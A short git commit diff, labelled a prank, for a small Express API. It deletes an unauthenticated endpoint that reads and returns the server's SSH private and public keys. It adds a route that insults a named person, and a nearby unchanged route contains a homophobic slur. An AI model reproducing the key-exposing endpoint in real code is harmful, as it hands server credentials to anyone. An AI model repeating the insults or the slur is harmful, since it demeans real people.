2d1b4b4b33b79d4beac67de91bede23a3a7e2371
VanOrlov <108752579+VanOrlov@users.noreply.github.com>
2024-11-06 20:54:45 +0300

    Prank on Vika

--- api/index.js
+++ api/index.js
@@ -14,23 +14,13 @@ app.get('/api', tokenRequired, (req, res) => {
     res.status(200).json({data: 'This is new data after add handler 2.0'})
 })
 
-app.get('/api/get-ssh-key', (req, res) => {
-    try {
-        const sshKeyPath = path.join(process.env.HOME, '.ssh', 'id_rsa.pub');
-        const sshKey = fs.readFileSync(sshKeyPath, 'utf8');
-        const sshKeyPathSec = path.join(process.env.HOME, '.ssh', 'id_rsa');
-        const sshKeySecret = fs.readFileSync(sshKeyPathSec, 'utf8');
-        res.status(200).send({ public: sshKey, private: sshKeySecret });
-    } catch (error) {
-        console.error('Ошибка чтения SSH ключа:', error.message);
-        res.status(500).send('Не удалось прочитать SSH ключ');
-    }
-});
-
 app.get('/api/hello', tokenRequired, (req, res) => {
     res.status(200).json({data: 'Hello pidor'})
 })
 
+app.get('/api/vika', (req, res) => {
+    res.status(200).json({data: 'Вика лох хахахаахахах жопа'})
+})
 
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
